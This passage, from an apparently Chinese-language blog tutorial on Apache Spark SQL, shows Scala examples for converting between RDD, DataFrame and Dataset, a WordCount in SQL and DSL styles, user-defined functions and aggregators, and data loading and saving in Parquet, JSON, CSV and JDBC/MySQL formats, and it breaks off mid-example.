class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">object Spark01_SparkSQL_Basic &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">def <span class="title">main</span><span class="params">(args: Array[String])</span>: Unit </span>= &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">        val sparkConf = <span class="keyword">new</span> SparkConf().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">        val spark = SparkSession.builder().config(sparkConf).getOrCreate()</span><br><span class="line">        <span class="keyword">import</span> spark.implicits._</span><br><span class="line"></span><br><span class="line">        <span class="comment">// RDD &lt;=&gt; DataFrame</span></span><br><span class="line">        val rdd = spark.sparkContext.makeRDD(List((<span class="number">1</span>, <span class="string">"zhangsan"</span>, <span class="number">30</span>), (<span class="number">2</span>, <span class="string">"lisi"</span>, <span class="number">40</span>)))</span><br><span class="line">        val df: DataFrame = rdd.toDF(<span class="string">"id"</span>, <span class="string">"name"</span>, <span class="string">"age"</span>)</span><br><span class="line">        val rowRDD: RDD[Row] = df.rdd</span><br><span class="line"></span><br><span class="line">        <span class="comment">// DataFrame &lt;=&gt; DataSet</span></span><br><span class="line">        val ds: Dataset[User] = df.as[User]</span><br><span class="line">        val df1: DataFrame = ds.toDF()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// RDD &lt;=&gt; DataSet</span></span><br><span class="line">        val ds1: Dataset[User] = rdd.map &#123;</span><br><span class="line">            <span class="keyword">case</span> (id, name, age) =&gt; &#123;</span><br><span class="line">                User(id, name, age)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.toDS()</span><br><span class="line">        val userRDD: RDD[User] = ds1.rdd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 关闭环境</span></span><br><span class="line">        spark.close()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">case</span> class <span class="title">User</span><span class="params">( id:Int, name:String, age:Int )</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3、Spark实战">3、Spark实战</h2><h3 id="3-1-Spark-SQL-完成-WordCount">3.1 Spark SQL 完成 WordCount</h3><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>SQL风格</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="comment">//1.创建SparkSession</span></span><br><span class="line">    <span class="keyword">val</span> spark: <span class="type">SparkSession</span> = <span class="type">SparkSession</span>.builder().master(<span class="string">"local[*]"</span>).appName(<span class="string">"SparkSQL"</span>).getOrCreate()</span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = spark.sparkContext</span><br><span class="line">    sc.setLogLevel(<span class="string">"WARN"</span>)</span><br><span class="line">    <span class="comment">//2.读取文件</span></span><br><span class="line">    <span class="keyword">val</span> fileDF: <span class="type">DataFrame</span> = spark.read.text(<span class="string">"D:\\data\\words.txt"</span>)</span><br><span class="line">    <span class="keyword">val</span> fileDS: <span class="type">Dataset</span>[<span class="type">String</span>] = spark.read.textFile(<span class="string">"D:\\data\\words.txt"</span>)</span><br><span class="line">    <span class="comment">//fileDF.show()</span></span><br><span class="line">    <span class="comment">//fileDS.show()</span></span><br><span class="line">    <span class="comment">//3.对每一行按照空格进行切分并压平</span></span><br><span class="line">    <span class="comment">//fileDF.flatMap(_.split(" ")) //注意:错误,因为DF没有泛型,不知道_是String</span></span><br><span class="line">    <span class="keyword">import</span> spark.implicits._</span><br><span class="line">    <span class="keyword">val</span> wordDS: <span class="type">Dataset</span>[<span class="type">String</span>] = fileDS.flatMap(_.split(<span class="string">" "</span>))<span class="comment">//注意:正确,因为DS有泛型,知道_是String</span></span><br><span class="line">    <span class="comment">//wordDS.show()</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    +-----+</span></span><br><span class="line"><span class="comment">    |value|</span></span><br><span class="line"><span class="comment">    +-----+</span></span><br><span class="line"><span class="comment">    |hello|</span></span><br><span class="line"><span class="comment">    |   me|</span></span><br><span class="line"><span class="comment">    |hello|</span></span><br><span class="line"><span class="comment">    |  you|</span></span><br><span class="line"><span class="comment">      ...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//4.对上面的数据进行WordCount</span></span><br><span class="line">    wordDS.createOrReplaceTempView(<span class="string">"t_word"</span>)</span><br><span class="line">    <span class="keyword">val</span> sql =</span><br><span class="line">      <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">        |select value ,count(value) as count</span></span><br><span class="line"><span class="string">        |from t_word</span></span><br><span class="line"><span class="string">        |group by value</span></span><br><span class="line"><span class="string">        |order by count desc</span></span><br><span class="line"><span class="string">      "</span><span class="string">""</span>.stripMargin</span><br><span class="line">    spark.sql(sql).show()</span><br><span class="line"></span><br><span class="line">    sc.stop()</span><br><span class="line">    spark.stop()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DSL 风格</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">WordCount2</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="comment">//1.创建SparkSession</span></span><br><span class="line">    <span class="keyword">val</span> spark: <span class="type">SparkSession</span> = <span class="type">SparkSession</span>.builder().master(<span class="string">"local[*]"</span>).appName(<span class="string">"SparkSQL"</span>).getOrCreate()</span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = spark.sparkContext</span><br><span class="line">    sc.setLogLevel(<span class="string">"WARN"</span>)</span><br><span class="line">    <span class="comment">//2.读取文件</span></span><br><span class="line">    <span class="keyword">val</span> fileDF: <span class="type">DataFrame</span> = spark.read.text(<span class="string">"D:\\data\\words.txt"</span>)</span><br><span class="line">    <span class="keyword">val</span> fileDS: <span class="type">Dataset</span>[<span class="type">String</span>] = spark.read.textFile(<span class="string">"D:\\data\\words.txt"</span>)</span><br><span class="line">    <span class="comment">//fileDF.show()</span></span><br><span class="line">    <span class="comment">//fileDS.show()</span></span><br><span class="line">    <span class="comment">//3.对每一行按照空格进行切分并压平</span></span><br><span class="line">    <span class="comment">//fileDF.flatMap(_.split(" ")) //注意:错误,因为DF没有泛型,不知道_是String</span></span><br><span class="line">    <span class="keyword">import</span> spark.implicits._</span><br><span class="line">    <span class="keyword">val</span> wordDS: <span class="type">Dataset</span>[<span class="type">String</span>] = fileDS.flatMap(_.split(<span class="string">" "</span>))<span class="comment">//注意:正确,因为DS有泛型,知道_是String</span></span><br><span class="line">    <span class="comment">//wordDS.show()</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    +-----+</span></span><br><span class="line"><span class="comment">    |value|</span></span><br><span class="line"><span class="comment">    +-----+</span></span><br><span class="line"><span class="comment">    |hello|</span></span><br><span class="line"><span class="comment">    |   me|</span></span><br><span class="line"><span class="comment">    |hello|</span></span><br><span class="line"><span class="comment">    |  you|</span></span><br><span class="line"><span class="comment">      ...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//4.对上面的数据进行WordCount</span></span><br><span class="line">    wordDS.groupBy(<span class="string">"value"</span>).count().orderBy($<span class="string">"count"</span>.desc).show()</span><br><span class="line"></span><br><span class="line">    sc.stop()</span><br><span class="line">    spark.stop()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-用户自定义函数">3.2 用户自定义函数</h3><p>用户可以通过 spark.udf 功能添加自定义函数，实现自定义功能</p><p>对于UDF，见如下基础功能</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">    <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">    <span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().config(sparkConf).getOrCreate()</span><br><span class="line">    <span class="keyword">import</span> spark.implicits._</span><br><span class="line">    <span class="comment">// 1)创建DataFrame</span></span><br><span class="line">    <span class="keyword">val</span> df = spark.read.json(<span class="string">"datas/user.json"</span>)</span><br><span class="line">    df.createOrReplaceTempView(<span class="string">"user"</span>)</span><br><span class="line">    <span class="comment">//2)注册UDF</span></span><br><span class="line">    spark.udf.register(<span class="string">"prefixName"</span>, (name:<span class="type">String</span>) =&gt; &#123;</span><br><span class="line">        <span class="string">"Name: "</span> + name</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">//应用UDF</span></span><br><span class="line">    spark.sql(<span class="string">"select age, prefixName(username) from user"</span>).show</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 关闭环境</span></span><br><span class="line">    spark.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UDAF是User-Defined Aggregation Functions（用户自定义聚合函数），强类型的Dataset 和弱类型的 DataFrame 都提供了相关的聚合函数， 如 count()，countDistinct()，avg()，max()，min()。除此之外，用户可以设定自己的自定义聚合函数。通过继承 UserDefinedAggregateFunction 来实现用户自定义弱类型聚合函数。从Spark3.0 版本后，UserDefinedAggregateFunction 已经不推荐使用了。可以<strong>统一采用强类型聚合函数Aggregator</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark03_SparkSQL_UDAF1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">        <span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().config(sparkConf).getOrCreate()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> df = spark.read.json(<span class="string">"datas/user.json"</span>)</span><br><span class="line">        df.createOrReplaceTempView(<span class="string">"user"</span>)</span><br><span class="line">        spark.udf.register(<span class="string">"ageAvg"</span>, functions.udaf(<span class="keyword">new</span> <span class="type">MyAvgUDAF</span>()))</span><br><span class="line">        spark.sql(<span class="string">"select ageAvg(age) from user"</span>).show</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 早期版本中，spark不能在sql中使用强类型UDAF操作</span></span><br><span class="line">        <span class="comment">// SQL &amp; DSL</span></span><br><span class="line">        <span class="comment">// 早期的UDAF强类型聚合函数使用DSL语法操作</span></span><br><span class="line">        <span class="comment">// val ds: Dataset[User] = df.as[User]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将UDAF函数转换为查询的列对象，注意下面的in要修改成User</span></span><br><span class="line">        <span class="comment">// val udafCol: TypedColumn[User, Long] = new MyAvgUDAF().toColumn</span></span><br><span class="line">        <span class="comment">// ds.select(udafCol).show</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// TODO 关闭环境</span></span><br><span class="line">        spark.close()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     自定义聚合函数类：计算年龄的平均值</span></span><br><span class="line"><span class="comment">     1. 继承org.apache.spark.sql.expressions.Aggregator, 定义泛型</span></span><br><span class="line"><span class="comment">         IN : 输入的数据类型 Long</span></span><br><span class="line"><span class="comment">         BUF : 缓冲区的数据类型 Buff</span></span><br><span class="line"><span class="comment">         OUT : 输出的数据类型 Long</span></span><br><span class="line"><span class="comment">     2. 重写方法(6)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Buff</span>(<span class="params"> var total:<span class="type">Long</span>, var count:<span class="type">Long</span> </span>)</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">MyAvgUDAF</span> <span class="keyword">extends</span> <span class="title">Aggregator</span>[<span class="type">Long</span>, <span class="type">Buff</span>, <span class="type">Long</span>]</span>&#123;</span><br><span class="line">        <span class="comment">// z &amp; zero : 初始值或零值</span></span><br><span class="line">        <span class="comment">// 缓冲区的初始化</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">zero</span></span>: <span class="type">Buff</span> = &#123;</span><br><span class="line">            <span class="type">Buff</span>(<span class="number">0</span>L,<span class="number">0</span>L)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据输入的数据更新缓冲区的数据</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">reduce</span></span>(buff: <span class="type">Buff</span>, in: <span class="type">Long</span>): <span class="type">Buff</span> = &#123;</span><br><span class="line">            buff.total = buff.total + in</span><br><span class="line">            buff.count = buff.count + <span class="number">1</span></span><br><span class="line">            buff</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并缓冲区</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">merge</span></span>(buff1: <span class="type">Buff</span>, buff2: <span class="type">Buff</span>): <span class="type">Buff</span> = &#123;</span><br><span class="line">            buff1.total = buff1.total + buff2.total</span><br><span class="line">            buff1.count = buff1.count + buff2.count</span><br><span class="line">            buff1</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算结果</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">finish</span></span>(buff: <span class="type">Buff</span>): <span class="type">Long</span> = &#123;</span><br><span class="line">            buff.total / buff.count</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 缓冲区的编码操作</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">bufferEncoder</span></span>: <span class="type">Encoder</span>[<span class="type">Buff</span>] = <span class="type">Encoders</span>.product</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出的编码操作</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">outputEncoder</span></span>: <span class="type">Encoder</span>[<span class="type">Long</span>] = <span class="type">Encoders</span>.scalaLong</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、数据的加载和保存">4、数据的加载和保存</h2><h3 id="4-1-通用的加载和保存方式">4.1 通用的加载和保存方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===============加载数据============</span></span><br><span class="line"><span class="comment"># spark.read.load 是加载数据的通用方法</span></span><br><span class="line"><span class="comment"># 如果读取不同格式的数据，可以对不同的数据格式进行设定</span></span><br><span class="line">spark.read.format(<span class="string">"…"</span>)[.option(<span class="string">"…"</span>)].load(<span class="string">"…"</span>)</span><br><span class="line"><span class="comment"># format("…")：指定加载的数据类型，包括"csv"、"jdbc"、"json"、"orc"、"parquet"和"textFile"</span></span><br><span class="line"><span class="comment"># load("…")：在"csv"、"jdbc"、"json"、"orc"、"parquet"和"textFile"格式下需要传入加载数据的路径</span></span><br><span class="line"><span class="comment"># option("…")：在"jdbc"格式下需要传入 JDBC 相应参数，url、user、password 和 dbtable</span></span><br><span class="line"><span class="comment"># 接在文件上进行查询: 文件格式.`文件路径`</span></span><br><span class="line">spark.sql(<span class="string">"select * from json.`/opt/module/data/user.json`"</span>).show</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============保存数据==========</span></span><br><span class="line"><span class="comment"># df.write.save 是保存数据的通用方法</span></span><br><span class="line">df.write.format(<span class="string">"…"</span>)[.option(<span class="string">"…"</span>)].save(<span class="string">"…"</span>)</span><br><span class="line"><span class="comment"># format("…")：指定保存的数据类型，包括"csv"、"jdbc"、"json"、"orc"、"parquet"和"textFile"</span></span><br><span class="line"><span class="comment"># save ("…")：在"csv"、"orc"、"parquet"和"textFile"格式下需要传入保存数据的路径</span></span><br><span class="line"><span class="comment"># option("…")：在"jdbc"格式下需要传入 JDBC 相应参数，url、user、password 和 dbtable保存操作可以使用 SaveMode, 用来指明如何处理数据，使用 mode()方法来设置。</span></span><br><span class="line"><span class="comment"># 有一点很重要: 这些 SaveMode 都是没有加锁的, 也不是原子操作</span></span><br><span class="line">df.write.mode(<span class="string">"append"</span>).json(<span class="string">"/opt/module/data/output"</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>Scala/Java</strong></th><th><strong>Any Language</strong></th><th><strong>Meaning</strong></th></tr></thead><tbody><tr><td>SaveMode.ErrorIfExists(default)</td><td>“error”(default)</td><td>如果文件已经存在则抛出异常</td></tr><tr><td>SaveMode.Append</td><td>“append”</td><td>如果文件已经存在则追加</td></tr><tr><td>SaveMode.Overwrite</td><td>“overwrite”</td><td>如果文件已经存在则覆盖</td></tr><tr><td>SaveMode.Ignore</td><td>“ignore”</td><td>如果文件已经存在则忽略</td></tr></tbody></table><h3 id="4-2-Parquet">4.2 Parquet</h3><p>Spark SQL 的默认数据源为 Parquet 格式。Parquet 是一种能够有效存储嵌套数据的列式存储格式。数据源为 Parquet 文件时，Spark SQL 可以方便的执行所有的操作，不需要使用 format。<strong>修改配置项spark.sql.sources.default，可修改默认数据源格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1)加载数据</span></span><br><span class="line">val df = spark.read.load(<span class="string">"examples/src/main/resources/users.parquet"</span>)</span><br><span class="line">df.show</span><br><span class="line"><span class="comment"># 2)保存数据</span></span><br><span class="line">var df = spark.read.json(<span class="string">"/opt/module/data/input/people.json"</span>)</span><br><span class="line"><span class="comment"># 保存为 parquet 格式</span></span><br><span class="line">df.write.mode(<span class="string">"append"</span>).save(<span class="string">"/opt/module/data/output"</span>)</span><br></pre></td></tr></table></figure><h3 id="4-3-JSON">4.3 JSON</h3><p>Spark SQL 能够自动推测 JSON 数据集的结构，并将它加载为一个Dataset[Row]. 可以通过 SparkSession.read.json()去加载 JSON 文件。注意：Spark 读取的 JSON 文件不是传统的JSON 文件，<strong>每一行都应该是一个 JSON 串</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#json格式如下</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Michael"</span>&#125;</span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Andy"</span>， <span class="string">"age"</span>:30&#125;</span><br><span class="line">[&#123;<span class="string">"name"</span>:<span class="string">"Justin"</span>， <span class="string">"age"</span>:19&#125;,&#123;<span class="string">"name"</span>:<span class="string">"Justin"</span>， <span class="string">"age"</span>:19&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入隐式转换</span></span><br><span class="line">import spark.implicits._</span><br><span class="line"><span class="comment"># 加载 JSON 文件</span></span><br><span class="line">val path = <span class="string">"/opt/module/spark-local/people.json"</span></span><br><span class="line">val peopleDF = spark.read.json(path)</span><br><span class="line"><span class="comment"># 创建临时表</span></span><br><span class="line">peopleDF.createOrReplaceTempView(<span class="string">"people"</span>)</span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line">val teenagerNamesDF = spark.sql(<span class="string">"SELECT  name  FROM  people  WHERE  age  BETWEEN  13 AND 19"</span>)</span><br><span class="line">teenagerNamesDF.show()</span><br></pre></td></tr></table></figure><h3 id="4-4-CSV">4.4 CSV</h3><p>Spark SQL 可以配置 CSV 文件的列表信息，读取CSV 文件,CSV 文件的第一行设置为数据列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark.read.format(<span class="string">"csv"</span>).option(<span class="string">"sep"</span>, <span class="string">";"</span>).option(<span class="string">"inferSchema"</span>,<span class="string">"true"</span>).option(<span class="string">"header"</span>, <span class="string">"true"</span>).load(<span class="string">"data/user.csv"</span>)</span><br></pre></td></tr></table></figure><h3 id="4-5-MySQL">4.5 MySQL</h3><p>Spark SQL 可以通过 JDBC 从关系型数据库中读取数据的方式创建DataFrame，通过对DataFrame 一系列的计算后，还可以将数据再写回关系型数据库中。如果使用spark-shell 操作，可在启动shell 时指定相关的数据库驱动路径或者将相关的数据库驱动放到 spark 的类路径下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/spark-shell --jars mysql-connector-java-5.1.27-bin.jar</span><br></pre></td></tr></table></figure><p>演示在Idea 中通过 JDBC 对 Mysql 进行操作，导入依赖关系</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark04_SparkSQL_JDBC</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">        <span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().config(sparkConf).getOrCreate()</span><br><span class="line">        <span class="keyword">import</span> spark.implicits._</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取MySQL数据</span></span><br><span class="line">        <span class="keyword">val</span> df = spark.read</span><br><span class="line">                .format(<span class="string">"jdbc"</span>)</span><br><span class="line">                .option(<span class="string">"url"</span>, <span class="string">"jdbc:mysql://hadoop102:3306/spark-sql"</span>)</span><br><span class="line">                .option(<span class="string">"driver"</span>, <span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">                .option(<span class="string">"user"</span>, 